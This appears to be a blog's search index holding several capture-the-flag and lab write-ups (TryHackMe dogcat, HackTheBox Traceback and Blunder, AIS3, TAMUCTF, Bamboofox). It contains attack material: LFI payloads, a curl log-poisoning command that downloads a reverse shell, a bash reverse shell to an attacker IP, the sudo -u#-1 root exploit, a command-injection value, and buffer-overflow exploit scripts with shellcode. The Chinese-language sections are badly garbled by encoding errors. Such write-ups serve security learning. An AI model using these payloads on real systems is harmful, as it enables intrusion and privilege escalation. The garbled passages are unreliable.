'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'FLAG': 'NISRA{<cencored>}', 'FLASK_DEEPER': '<censored>'}>\n```\n\n\nAnd because this is not intended solution, we can reuse this payload in flask-deeper.","categories":["writeup","wargame","NISRA Enlightment 2020","Flask"]},{"title":"thm-dogcat","url":"/en/2020/thm-dogcat/","content":"\n\n\n## Recon\n\n### Nmap\n```\n$ nmap -A 10.10.246.103\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 19:45 CST\nNmap scan report for 10.10.246.103\nHost is up (0.29s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)\n|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)\n|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: dogcat\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\nJust some usual services.\n\nWith the description on the THM dashboard, we could assume this is a PHP-related bug.\n\n### Website\nSo by clicking every button on the website we should see the URL like this `http://10.10.246.103/?view=dog`.\nWith my experience, this could leads to LFI, but it's just a guess.\n\nFirst, we can make `view` argument in to a array by sending this `?view[]=1`, AND THE SERVER RESPOND WITH ERROR MEESSAGE LOL.\n{% asset_img web_error.png %}\n\nWe can analyze the error message.\n\n1. strpos failed. so it checks if the value have `dog` or `cat`\n2. the php script includes `Array.php` hmmmm :thinking:\nBecause we sent a array, so the value to string is `Array`.\n\nSo we can confirm that we have a LFI!\n\n## Get RCE\n\n### LFI\nFirst we can try if we can perform a LFI attack.\n\nAfter trying some payload, we can read source code with this payload `?view=php://filter/convert.base64-encode/resource=dog/../index`\n\nDecode the response we got these code. We can see that there is a extra param `ext`, which control the extension we include. So if we set `ext` to a blank value, it can read everything, not just php file.\n```php\n<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>dogcat</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/style.css\">\n</head>\n\n<body>\n    <h1>dogcat</h1>\n    <i>a gallery of various dogs or cats</i>\n\n    <div>\n        <h2>What would you like to see?</h2>\n        <a href=\"/?view=dog\"><button id=\"dog\">A dog</button></a> <a href=\"/?view=cat\"><button id=\"cat\">A cat</button></a><br>\n        <?php\n            function containsStr($str, $substr) {\n                return strpos($str, $substr) !== false;\n            }\n            $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';\n            if(isset($_GET['view'])) {\n                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {\n                    echo 'Here you go!';\n                    include $_GET['view'] . $ext;\n                } else {\n                    echo 'Sorry, only dogs or cats are allowed.';\n                }\n            }\n        ?>\n    </div>\n</body>\n\n</html>\n```\n\n\nSo, we got the source code, than came up with this `?view=dog/../../../../../../../../etc/passwd&ext=`, and it did return the passwd file. LFI really works.\n\n\nAnd here, I try to read access.log from apache2, because we can control the User-Agent, and by using LFI, we can execute PHP code! After trying, the access.log is stored in the default path. we can try to get a RCE!\n\n\n### RCE\nWe can control User-Agent with `curl` command (this is faster, we don't need BurpSuite for this easy task.)\nI have a php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).\n\nWe can use `file_get_contents` and `file_put_contents` to download file.\n\n\nFirst, setup a http server on my laptop (I'm using python3's http.server) (And a nc server for reverse shell)\nPayload: `curl -A \"<?php file_put_contents('racterub.php', file_get_contents('http://10.2.30.75:8080/rev.php'))?>\" http://10.10.246.103/`\n\nAnd include the access.log should trigger the php code. In the terminal you should see something like this:\n{% asset_img send_reverse_shell.png %}\n\nBy accessing the uploaded file, we will get reverse shell in our terminal.\n{% asset_img shell.png %}\n\n## Flags\n\n### Get flag1\ncd to `/var/www/html` you can see the flag1 file.\n{% asset_img flag1.png %}\n\n### Get flag2\njust in `/var/www` you can also see the flag2 file.\n{% asset_img flag2.png %}\n\n### Get flag 3\nexecute `sudo -l` it says we can execute `/usr/bin/env` as root, so by checking on [GTFOBins](https://gtfobins.github.io/) we can do a privilege escalation with it.\n{% asset_img flag3.png %}\n\n### Get flag 4\nI stuck at this for a while, and find that in `/opt/backups` have a script that backup file and execute from host.\nAnd while you looking around in the filesystem you should see a `.dockerenv` file in the `/`, which means this is a docker container. And this backup script should be execute by host user.\nBecause, we got root, we can modify `backup.sh` to make a reverse shell.\n\nPayload:\n```bash\necho \"#!/bin/bash\\n/bin/bash -i >& /dev/tcp/10.2.30.75/8888 0>&1\\n\" > backup.sh\n```\n\nAnd we open a nc server and wait host to execute the backup script, and we got flag 4!\n\n{% asset_img flag4.png %}\n\n\n\n","categories":["writeup","pentest","thm","dogcat"]},{"title":"htb-traceback","url":"/en/2020/htb-traceback/","content":"\n\n## Recon\n\n### Nmap\n\n```\nPORT   STATE  SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)\n|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)\n|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Help us\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n### Dir Fuzz\nPath fuzzing with `ffuf` and `dirsearch`, but both tool didn't find any :(\n\n\nThan I thought, there's a nickname called `Xh4H`, so I googled \"Xh4H webshell\", and found this tweet [link](https://twitter.com/riftwhitehat/status/1237311680276647936).\n\nAnd after few tries, there is a webshell called `smevk.php` on the server. LOL\n\n\n## Doing dirty stuff\n\n\n### Getting reverse shell\nSo we can upload a php shell to the server. Here I choose this webshell [Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), which can generate a reverse shell once you execute it.\n\nAnd we got a reverse shell with webadmin account!\n\n```\nLinux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n 07:15:23 up  1:22,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)\n/bin/sh: 0: can't access tty; job control turned off\n$\n```\n\n\n### Getting user\n\nInside `/home/webadmin` we have a `note.txt` and a `privesc.lua`.\n\nnote.txt, privesc.lua:\n```\n$ cat privesc.lua\nos.execute(\"/bin/sh\")\n$ cat note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\n```\n\nSo maybe using privesc.lua can make me to user account.\n\nDig deeper we can see `.bash_history`, someone is using executing privesc.lua with this command `sudo -u sysadmin /home/sysadmin/luvit privesc.lua`\n\nBy executing it, we got `sysadmin` account!\n\n```$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua\nsh: turning off NDELAY mode\nid\nuid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)\n```\n\n\n### Getting root\n\nExecuting `ps -aux` serveral times, there's a process like this.\n\n```\nroot      11790  0.0  0.0   4628   824 ?        Ss   07:23   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\n```\n\n`update-motd.d` is a banner for welcoming login users (as well as ssh users).\n\nBecause `update-motd.d` is running with root permission, and it can also execute command, we might steal root flag from here.\n\nFirst, we need to upload our ssh public key.\n\nSecond, append `cat /root/root.txt` to  `update-mote.d/00-header`\n\nThan, ssh to the machine, and we got root flag!","categories":["writeup","pentest","htb","traceback"]},{"title":"htb-blunder","url":"/en/2020/htb-blunder/","content":"\n\n## Recon\n\nScan ports with nmap first.\n\n### Nmap\n```\nPORT   STATE  SERVICE VERSION\n21/tcp closed ftp\n80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: Blunder\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Blunder | A blunder of interesting facts\n```\n\n### Dir Fuzz\nPath fuzzing with `ffuf` and `dirsearch`.\n\n```\nffuf\n\nabout                   [Status: 200, Size: 3280, Words: 225, Lines: 106]\n# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 7561, Words: 794, Lines: 171]\n0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]\nadmin                   [Status: 301, Size: 0, Words: 1, Lines: 1]\nusb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]\nLICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]\n                        [Status: 200, Size: 7561, Words: 794, Lines: 171]\n\n\ndirsearch\n\n...\n[20:32:51] 200 -  563B  - /.gitignore\n...\n[20:33:27] 200 -    3KB - /about\n[20:33:38] 301 -    0B  - /admin  ->  http://10.10.10.191/admin/\n...\n[20:36:39] 200 -    1KB - /LICENSE\n[20:37:48] 200 -    3KB - /README.md\n...\n[20:45:31] 200 -  118B  - /todo.txt\n...\n```\n\nAfter fuzzing complete, we know there is a CMS called `bludit` and version is `3.9.2` (you can get version from css' version argument).\n\nWith this information we can search CVE and found this [CVE-2019-16113](cvedetails.com/cve/CVE-2019-16113/), and found the original writeup of this CVE [link](https://christa.top/details/46/) (which is written in chinese).\n\nThis exploit needs to be authencated. So we should find the CMS' account first.\n\n## Doing dirty stuff\n\n### Gaining access to CMS.\n\nDuring recon, i noticed that there's a `todo.txt` which mentioned a name called fergus, so we have two account name to bruteforce, fergus and admin. (admin is set by default in bludit). Also during recon, I found a script that allows me to bruteforce [link](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb). But using either admin and fergus as username and rockyou.txt as password list didn't success.\n\nWatching forum on htb, there's a hint that we should use CeWL, which can generate custon wordlist from website. And we got a ACCOUNT !! (fergus/RolandDeschain)\n\n### Having RCE\nUsing CVE that we previously found, we can upload `.htaccess` first to disable `RewriteEngine`, and we upload a php shell to the machine.\n\nWith php shell, we can persist our control by trying to get reverse shell. I'm using [python reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python). And we got a reverse shell with `www-data` account.\n\n```\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n```\n\n### Getting user\n\nPlaying in the machine, we can find there's a newer version of `bludit`. And I looked into bludit's github repo and found that there's a users.php inside `$bludit_path/bl-content/databases/` and you can see there's a account called `hugo` with the password hash. You can get the plaintext by searching online which is `Password120`\n\nSo we can use `su hugo` to get user account.\n\n```\n$ ls\nbludit-3.10.0a\nbludit-3.9.2\nhtml\n$ pwd\n/var/www\n```\n```\n$ cat users.php\n<?php defined('BLUDIT') or die('Bludit CMS.'); ?>\n{\n    \"admin\": {\n        \"nickname\": \"Hugo\",\n        \"firstName\": \"Hugo\",\n        \"lastName\": \"\",\n        \"role\": \"User\",\n        \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\",\n        \"email\": \"\",\n        \"registered\": \"2019-11-27 07:40:55\",\n        \"tokenRemember\": \"\",\n        \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\",\n        \"tokenAuthTTL\": \"2009-03-15 14:00\",\n        \"twitter\": \"\",\n        \"facebook\": \"\",\n        \"instagram\": \"\",\n        \"codepen\": \"\",\n        \"linkedin\": \"\",\n        \"github\": \"\",\n        \"gitlab\": \"\"}\n}\n```\n\n\n### Getting root\n\nAfter changing account to hugo, we can't execute `sudo -l` because we didn't have proper pty terminal. By using `python -c 'import pty;pty.spawn(\"/bin/bash\")'` we can generate a valid pty terminal.\n\n```\n$ su hugo\nPassword: Password120\nwhoami\nhugo\n```\n\n\nExecuting `sudo -l` we have following response:\n\n```\nMatching Defaults entries for hugo on blunder:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser hugo may run the following commands on blunder:\n    (ALL, !root) /bin/bash\n```\n\nGoogling `(ALL, !root) /bin/bash`, we can gain root with this exploit `sudo -u#-1 /bin/bash`\n\n```\nhugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash\n<-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash\nroot@blunder:/var/www/bludit-3.10.0a/bl-content/databases# id\nid\nuid=0(root) gid=1001(hugo) groups=1001(hugo)\n```\n\n\nAnd here's the root!","categories":["writeup","pentest","htb","blunder"]},{"title":"AIS3 Pre-Exam 2020","url":"/zh-tw/2020/ais3-2020/","content":"\n\nè‡¨æ™‚æ±ºå®šåƒåŠ  Pre-Examï¼Œå¤ªä¹…æ²’æ‰“äº†ï¼Œä»€éº¼ä¹Ÿæ²’æº–å‚™\nåæ¬¡ä¹Ÿçˆ›åˆ°è‡ªå·±ä¸æ•¢çœ‹\n\nå¯«é» writeupï¼Œè¨˜éŒ„è‡ªå·±æœ‰å¤šçˆ›\n\n<!-- more -->\n\n## Crypto\n\n### Brontosaurus\n\nè·Ÿå»å¹´çš„ `kcufSJ` åŒé¡Œå‹\n\nå°±æŠŠè³‡æ–™ reverse ä¹‹å¾Œä¸Ÿé€² chrome çš„ console å°±å¥½äº†\n\nFlag:\n{% asset_img brontosaurus_flag.png %}\n\n### T-Rex\n\nå»ºè¡¨ä¹‹å¾ŒæŸ¥è¡¨å°±å¯ä»¥æ‹¿åˆ° flag äº†\n\nFlag:\n{% asset_img T-Rex_flag.png %}\n\n## Misc\n\n### Karuego\nä¸‹è¼‰ä¸‹ä¾†çš„æ˜¯ä¸€å¼µç…§ç‰‡ï¼Œé€é `Binwalk` å¯ä»¥å¾—çŸ¥ä»–å¾Œé¢æ‹¼æ¥äº†ä¸€å€‹å£“ç¸®æª”ã€‚é€é `dd` å°‡å£“ç¸®æª”å–å‡ºå¾Œç™¼ç¾å·²åŠ å¯†éäº†\n\nå‰é¢ `Binwalk` çš„çµæœå¯ä»¥çœ‹åˆ°å£“ç¸®æª”å…§æœ‰ä¸€å€‹ `files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.png`ã€‚Google éå¾Œæ‰¾åˆ°åŒä¸€å¼µç…§ç‰‡ï¼Œæœ€å¾Œä½¿ç”¨ `pkcrack` ä¾†çˆ†å¯†ç¢¼\n\nresult:\n{% asset_img karuego_pkcrack.png %}\n\nè§£å£“ç¸®æª”æ¡ˆå°±å¯ä»¥çœ‹åˆ°æœ‰ flag çš„ç…§ç‰‡äº†\nFlag:\n{% asset_img karuego_flag.png %}\n\n### Soy\nçµ¦äº†ä¸€å¼µæœ‰æ±¡æ¼¬çš„ QR codeã€‚é€é QR code å¯ä»¥å®¹è¨±ç¼ºè³‡æ–™çš„ç‰¹æ€§ï¼Œç›¡å¯èƒ½åœ°é‚„åŸä¹‹å¾Œä¾èˆŠå¯ä»¥è®€å–åˆ° flag\n\né¡Œç›®ï¼š\n{% asset_img soy_soy.png %}\n\nFlag:\n{% asset_img soy_flag.png %}\n\n## Reverse\n\n### FallenBeat\né¡Œç›®æ˜¯ä¸€å€‹ jar æª”æ¡ˆï¼Œä½¿ç”¨ JD-GUI å°±å¯ä»¥åç·¨è­¯äº†\n\né¦–å…ˆå…ˆåœ¨ `PanelEnding.class` å…§æ‰¾åˆ° flag\n{% asset_img fallenbeat_flagarray.png %}\n\næ¥ä¸‹ä¾†å¾€ä¸‹æ‘¸å¯ä»¥çœ‹åˆ° flag é€éè·Ÿ cache åš xor ä¹‹å¾Œå°±æ˜¯æˆ‘å€‘è¦çš„ flag\n{% asset_img fallenbeat_flagxorcache.png %}\n\nå¾€ä¸Šæ‘¸çœ‹åˆ° `cache` æ˜¯åƒæ•¸å‚³é€²ä¾†çš„ï¼Œä½¿ç”¨å…¨åŸŸæœå°‹æ‰¾åˆ° `GameControl.class` ä½¿ç”¨äº†é€™å€‹å‡½æ•¸\n{% asset_img fallenbeat_searchcache.png %}\n\nè·Ÿè‘—çœ‹å¯ä»¥çœ‹åˆ°ä»–æ˜¯å­˜æŸå€‹æª”æ¯ä¸€è¡Œçš„æ•¸å­—ï¼Œä¸”æª”åæ˜¯åƒæ•¸å‚³é€²ä¾†çš„ï¼Œå†æ¬¡ç”¨å…¨åŸŸæœå°‹æ‰¾åˆ° `Frame.class` ä½¿ç”¨äº†é€™å€‹å‡½æ•¸ï¼Œå¯ä»¥çœ‹åˆ°æª”æ¡ˆç‚º `songs/gekkou/hell.txt`\n\næ¥ä¸‹ä¾†å°±æ˜¯åšä¸€ä¸²è™•ç†å°±å¯ä»¥å¾—åˆ° flag äº†\n\nFlag:\n{% asset_img fallenbeat_flag.png %}\n\n### TsaiBro\nè·Ÿå»å¹´å·®ä¸å¤šæˆ‘å°±æ‡¶å¾—å¯«äº†\nä¸Š flag\n\nFlag:\n{% asset_img tsaibro_flag.png %}\n\n## Web\n\n### Elephant\nåœ¨ `CTFd` ä¸Šé¢æœ‰æç¤ºç¶²é æœ‰æç¤ºï¼Œé–‹ devtool å°±å¯ä»¥çœ‹åˆ°äº†\n{% asset_img elephant_hint.png %}\n\nçœ‹åˆ°æç¤º Source Code å°±æœƒæƒ³åˆ° Gitï¼Œä½†æ˜¯å›å‚³ Forbiddenï¼Œè³­ä»–è¦å‰‡æ²’å¯«å¥½ï¼Œç€è¦½ `/.git/HEAD` å°±æœƒç™¼ç¾ä»–åªæœ‰è³‡æ–™å¤¾ï¼Œæª”æ¡ˆéƒ½æ²’æ“‹åˆ°\n{% asset_img elephant_githead.png %}\n\né€é GitHack å¯ä»¥å°‡åŸå§‹ç¢¼ä¸‹è¼‰ä¸‹ä¾†\n{% asset_img elephant_sourcecode.png %}\n\nå¯ä»¥çœ‹åˆ°æˆ‘å€‘åŸºæœ¬ä¸Šæ˜¯è¦åšåˆ° `canReadFlag()` é€™å€‹å‡½å¼è¦å›å‚³ 1ã€‚\né€™å€‹æ™‚å€™ php åˆ©ç”¨å„ªç§€çš„ç‰¹æ€§å°±å¯ä»¥åšåˆ°äº†ï¼Œç•¶ `strcmp` å…©å€‹å‹æ…‹ä¸ç›¸åŒæ™‚æœƒå›å‚³ `0`ï¼Œæ‰€ä»¥ä½ å¯ä»¥æ”¹æˆ `NULL` æˆ–æ˜¯ `array`ã€‚\n\nåœ¨è‡ªå·±çš„æ©Ÿå™¨ä¸Šå¯«å‡ºç›¸åŒçš„ Code ï¼Œåªæ˜¯å°‡ `$this->token` æ”¹æˆ NULLå³å¯ã€‚\nExploit:\n{% asset_img elephant_exploit.png %}\n\nFlag:\n{% asset_img elephant_flag.png %}\n\n### Shark\né¡Œç›®ä¸€é–‹å§‹å°±æç¤ºäº† flag åœ¨æŸå€‹å…§ç¶²æ©Ÿå™¨çš„ `/flag` è£¡é¢\n{% asset_img shark_hint.png %}\n\nå¾ URL å°±å¯ä»¥çŒœæ¸¬æ¼æ´ç‚º LFIï¼Œæ¸¬è©¦çµæœä¹Ÿæ­£ç¢ºï¼ŒæŸ¥çœ‹ `/etc/hosts` å¯ä»¥çŸ¥é“ `172.22.0.3` æ˜¯æˆ‘å€‘ç¾åœ¨ç©çš„æ©Ÿå™¨çš„ IPï¼Œæ¸¬è©¦é„°è¿‘çš„ IP å¯ä»¥ç™¼ç¾ `172.22.0.2` æ˜¯ä¸€å° nginx serverï¼Œç€è¦½ `/flag` å³å¯æ‹¿åˆ° flag\n{% asset_img shart_hosts.png %}\n\n\nFlag:\n{% asset_img shark_flag.png %}\n\n### Snake\né¡Œç›®ä¸€é€²å»å°±æœƒçµ¦ä½ åŸå§‹ç¢¼ï¼Œå¯ä»¥çœ‹åˆ°æ¼æ´æ‡‰è©²æ˜¯ pickle çš„éƒ¨åˆ†\n{% asset_img snake_sourcecode.png %}\n\né€éä¸‹åˆ— code å¯ä»¥é”æˆ RCE\n{% asset_img snake_exploit.png %}\n\næœ€å¾Œåœ¨ `/flag`å¾—åˆ° flag\n\nFlag:\n{% asset_img snake_flag.png %}\n\n### Squirrel\nçœ‹åˆ°ç¶²é åŸå§‹ç¢¼å¯ä»¥ç™¼ç¾ä»–æ˜¯å¾ `api.php` å‚³å…¥ä¸€å€‹çµ•å°è·¯å¾‘ï¼Œç„¶å¾Œè®€å–è³‡æ–™ï¼Œé€™å°±æ˜¯ä¸€å€‹å¾ˆç°¡å–®çš„ LFI\n{% asset_img squirrel_webcode.png %}\n\né€é LFI çœ‹ api.php çš„åŸå§‹ç¢¼ï¼Œå¯ä»¥ç™¼ç¾ä»–æ˜¯ç›´æ¥ç”¨ `shell_exec(\"cat '$file'\")` ä¾†è®€æª”æ¡ˆï¼Œexploit å°± `';cmd;'`å³å¯ã€‚\næœ€å¾Œåœ¨ `/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`\n\nFlag:\n{% asset_img squirrel_flag.png %}\n","categories":["writeup","AIS3","2020"]},{"title":"TAMUCTF-2018","url":"/zh-tw/2018/tamuctf-2018/","content":"\n\nå¤ªå¤šæƒ…å¢ƒé¡Œäº†\nweb æ»¿æ»¿çš„æ°´é¡Œæœ‰é»ç„¡è¨€\nåªå¯«ä¸€äº›å€¼å¾—ç´€éŒ„çš„\n\n<!-- more -->\n\n## Misc\n### you can run, you can hide [25]\n\n```\nfind the hidden flag.\n\nssh tamuctf@shell1.ctf.tamu.edu -p 2223\npassword: tamuctf\n```\n\nssh é€²å»ä¹‹å¾Œç™¼ç¾ä»–æ˜¯ç”¨`rbash`ï¼Œæ„å¤–åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°ç¥å¥‡ payload (åˆ°ç¾åœ¨é‚„ä¸çŸ¥é“åŸç†)\n`BASH_CMDS[a]=/bin/sh;a`\n[Source](https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html)\n\nç›®éŒ„è£¡é¢ç›´æ¥å°±æœ‰flagäº†\n`gigem{TAMU_secret_society_qSD358OUYGcezTlFbqeh}`\n\nå¾Œé¢ç¥éšŠå‹çµ¦äº†å¦ä¸€å€‹ payload (åœ¨çœ‹é€£å…¥çš„é€£ç·šçš„æ™‚å€™ç™¼ç¾å¥½åƒå¤§éƒ¨åˆ†éƒ½æ˜¯é€™æ¨£é€£å…¥çš„)\n`ssh tamuctf@shell1.ctf.tamu.edu -p 2223 -t \"bash --noprofile\"`\n\n### enum [150]\n\n```\nFind the hidden flag.\nYou do not need to bruteforce. Don't do it.\n\nssh tamuctf@shell2.ctf.tamu.edu -p 2222\npassword: tamuctf\n```\n\né€™é¡Œå¡å¾ˆä¹…ï¼Œæœ€å¾Œé éšŠå‹ carry\né€£çºŒå‰é¢ä¸€é¡Œï¼Œç¹éä¹‹å¾Œæˆ‘ä¸€é–‹å§‹åœ¨`/var/backups/`æ‰¾åˆ°`.srv.bak`ï¼Œè£¡é¢æ”¾äº†å¸³è™Ÿè·Ÿå¯†ç¢¼\nå¾Œä¾†å°±æ˜¯éšŠå‹carryçš„éƒ¨åˆ†äº†\nç”¨`ps aux`æŒ‡ä»¤ç™¼ç¾æœ‰ä¸€å€‹ç¨‹åºæ˜¯åŸ·è¡Œ`/bin/bash -c /usr/sbin/service ssh restart && cd /.administrators && /usr/bin/python /.administrators/pyserver.py 9000`\nå¾Œä¾†åœ¨è‡ªå·±çš„é›»è…¦åŸ·è¡Œ`ssh -L 1234:localhost:9000 tamuctf@shell2.ctf.tamu.edu -p 2222`(port forwarding)ï¼Œåœ¨è‡ªå·±çš„ç€è¦½å™¨é–‹å•Ÿ`localhost:1234`å†è¼¸å…¥ä¹‹å‰æ‰¾åˆ°çš„å¸³è™Ÿå¯†ç¢¼å°±å¯ä»¥å¾—åˆ° flag  äº†\n`gigem{pivot_piv0t_P1V0T_20975430987aff92qf89qf}`\n\n## Pwn\n### Pwn1\nåªæ˜¯è¦†è“‹`cmp DWORD PTR [ebp-0xc],0xf007ba11`è€Œå·²\n\nPayload:\n```bash\npython -c \"print 'a'*23 + '\\x11\\xba\\x07\\xf0'\" | nc pwn.ctf.tamu.edu 4321\n```\n\n### Pwn2\nåŸ·è¡Œ`echo`å‡½å¼æ™‚ï¼Œå¯ä»¥ Overflow è·³åˆ°`print_flag`\n\nPayload:\n```bash\npython -c \"print 'a'*243 + '\\x4b\\x85\\x04\\x08'\" | nc pwn.ctf.tamu.edu 4322\n```\n\n### Pwn3\nè§€å¯Ÿäº†ä¸€ä¸‹æœƒç™¼ç¾è¼¸å‡ºçš„ random number æœƒæ˜¯ buffer çš„èµ·å§‹åœ°å€ï¼Œæ‰€ä»¥æ–¹å‘å°±å¾ˆæ¸…æ¥šäº† `return to shellcode`\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\n#r = process('./pwn3')\n#r = remote('0.0.0.0', 8888)\nr = remote('pwn.ctf.tamu.edu', 4323)\ncontext.log_level = 'debug'\ncontext.arch = 'i386'\n\nr.recvuntil('Your random number ')\naddr = int(r.recv(10).strip(), 16)\n\nshellcode = asm(shellcraft.i386.linux.sh())\n\npayload = shellcode + 'a' * (242-len(shellcode)) + p32(addr)\n\nprint hex(addr)\nprint p32(addr)\nprint payload\n\nr.recvuntil('?')\n#raw_input('########')\nr.sendline(payload)\n```\n\n### ç¸½çµ\næˆ‘ pwn è·Ÿä¸­é‚ªä¸€æ¨£ï¼Œpayload æˆ‘å¯«éƒ½ä¸éï¼ŒéšŠå‹å¯«éƒ½é==\né€™å ´æƒ…å¢ƒé¡Œå¤ªå¤šäº†ï¼Œæ„Ÿè¦ºä¸åƒä¸€èˆ¬çš„ CTF åè€Œæ¯”è¼ƒåƒæ”¿åºœè¾¦çš„è³‡å®‰æ¯”è³½","categories":["writeup","CTF","TAMUCTF","2018"]},{"title":"Bamboofox CTF 2017","url":"/zh-tw/2018/bamboofox-2017/","content":"\n\n\néäº†å¥½å¹¾å€‹æœˆé‡å›äº† CTF æ¯”è³½ï¼Œä½†æ˜¯é€™æ¬¡è€ƒçš„æ˜¯æˆ‘ä»¥å‰æ²’å­¸éçš„ x64 å†åŠ ä¸Šæˆ‘å®Œå…¨å¿˜è¨˜è¦å¦‚ä½•è§£é¡Œ ï¼Œè®Šå¾— pwn åªæ‹¿ä¸‹ä¸€é¡Œï¼ŒæŒºå¤±æœ›çš„ QQ\n\n<!-- more -->\n\n`é€™è£¡å°±ä¸åˆ†äº« FLAG äº†ï¼Œåªæœƒå¯«å‡ºè§£æ³•(ä¹Ÿæ²’å¹¾é¡ŒQQ`\n\n## Misc\n\n### suck-browser\nåˆæ˜¯å€‹ `302` çš„å‘ï¼Œç”¨ `curl` å°±å¯ä»¥åœæ­¢è‡ªå‹•è·³è½‰\n\n### suck-apple\nä¸€å€‹æ™‚äº‹æ¢—ï¼Œåªç”¨ `root` ç•¶ä½œç”¨æˆ¶åï¼Œä¸éœ€è¦å¯†ç¢¼å³å¯æœ‰ `root` æ¬Šé™\n\n## Web\n\n### suck-login\n\nDescription:\n```\nThere is a suck login page and I found the md5 hash password is 0e836584205638841937695747769655.\n\nCan you crack it?!\n```\n\né¡Œç›®æœ‰æç¤º `hash(å¯†ç¢¼)` æ˜¯ `0e` é–‹é ­çš„ï¼Œå°±å¯ä»¥è¯æƒ³åˆ°æ˜¯ php æœƒè‡ªå‹•è½‰å½¢æ…‹çš„å•é¡Œï¼Œ\nå› ç‚º php æœƒè‡ªå‹•æŠŠå¯†ç¢¼çš„é›œæ¹Šå€¼è½‰æˆç§‘å­¸è¨˜è™Ÿï¼Œè®Šæˆ0\næ‰€ä»¥å¯†ç¢¼åªè¦å†æ‰¾ä¸€çµ„é›œæ¹Šå€¼ä¸€æ¨£ç‚º0çš„å°±å¯ä»¥å¾—åˆ° FLAG\n\n### tiny-git\nçœ‹åˆ°é¡Œç›®ï¼Œä¸€é–‹å§‹å°±å…ˆçœ‹ `/.git/` è³‡æ–™å¤¾ï¼Œç™¼ç¾æœƒè¿”å› `403 Forbidden`ï¼Œ\nåˆ©ç”¨ `Denny` å¤§å¤§çš„ Sctipt [(Link)](https://github.com/denny0223/scrabble)\nå¯ä»¥ç™¼ç¾æª”æ¡ˆä¾èˆŠå¯ä»¥ä¸‹è¼‰ï¼Œä½†æ˜¯å­ç›®éŒ„çš„æª”æ¡ˆå› ç‚ºæœƒè¿”å› 403\næ‰€ä»¥æ²’è¾¦æ³•ç­è§£å…§éƒ¨æª”æ¡ˆç‹€æ³\né€™æ™‚å€™å°±è¦ç§‘æ™®ä¸€ä¸‹ git çš„å„²å­˜æ–¹å¼\n[å°æ–¼ git çš„å°è§£é‡‹](https://www.siteground.com/tutorials/git/directory-structure/)\nåœ¨æ‰¾åˆ° log ä¹‹å¾Œç™¼ç¾ä»–ç›´æ¥åœ¨ commit messege è£¡é¢å¯«ä¸Š FLAG\n\n## pwn 